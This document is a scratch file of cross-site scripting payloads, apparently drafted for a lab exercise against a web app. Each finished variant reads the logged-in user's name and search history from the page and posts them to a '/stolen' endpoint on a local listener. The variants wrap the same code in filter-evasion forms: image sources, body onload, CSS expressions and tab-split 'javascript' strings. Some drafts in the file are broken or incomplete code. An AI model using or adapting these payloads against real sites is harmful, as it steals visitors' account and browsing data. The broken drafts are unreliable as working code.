
xss_payload.html


<script>var id = document.getElementById('logged-in-user').innerHTML;</script>
<script>console.log(document.getElementById('logged-in-user').innerHTML)</script>

<script>window.onload = function () { console.log(document.getElementById('logged-in-user').innerHTML,document.getElementsByClassName('history-item list-group-item').item(1))}</script>




divChild = document.getElementById("history-list").children[0];

history-item list-group-item

<script>var list= document.getElementsByClassName("history-list");
for (var i = 0; i < list.length; i++) {
    console.log(list[i].id);
}</script>


// $.post(‘http://127.0.0.1:31337/stolen?user=<username>&last_search=<last search>’,
<script>

var url = "127.0.0.1:31337/stolen";
var params = "user="+document.getElementById('logged-in-user').innerHTML+"&last_search"+window.onload = function () {document.getElementsByClassName('history-item list-group-item').item(1))};

console.log(total);
</script>
var xhr = new XMLHttpRequest();
xhr.open("POST", yourUrl, true);
xhr.setRequestHeader('Content-Type', '');xhr.send(JSON.stringify({value: value}));
//
// http.open("GET", url+"?"+params, true);
// http.onreadystatechange = function() {//Call a function when the state changes.
// 	if(http.readyState == 4 && http.status == 200) {
// 		alert(http.responseText);
// 	}
// }
window.location.href=send;

ORIG:
<script>window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}</script>



<!---->window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}<!---->

<IMG SRC="(javascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())}">


<BODY ONLOAD=(window.onload = function() {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()})>


<DIV STYLE="width: expression(var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())">


<IMG SRC="jav&#x09;ascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()};">
